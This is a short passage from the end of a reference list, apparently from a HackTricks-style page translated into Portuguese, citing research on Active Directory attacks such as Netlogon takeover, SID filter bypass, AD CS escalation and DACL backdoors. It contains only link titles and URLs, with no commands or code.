- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Uma jornada pelas interfaces esquecidas de Null Session e MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [O filtro SID como limite de segurança entre domínios? (Parte 4) - Pesquisa sobre bypass do filtro SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [O filtro SID como limite de segurança entre domínios? (Parte 5) - Ataque de confiança Golden GMSA - do filho para o pai](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [O filtro SID como limite de segurança entre domínios? (Parte 6) - Ataque de confiança por alteração do Schema - do filho para o pai](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA para EA com ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalando de administradores do domínio filho para administradores corporativos em 5 minutos abusando do AD CS, uma continuação](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Uma ACE na manga: projetando backdoors DACL do Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
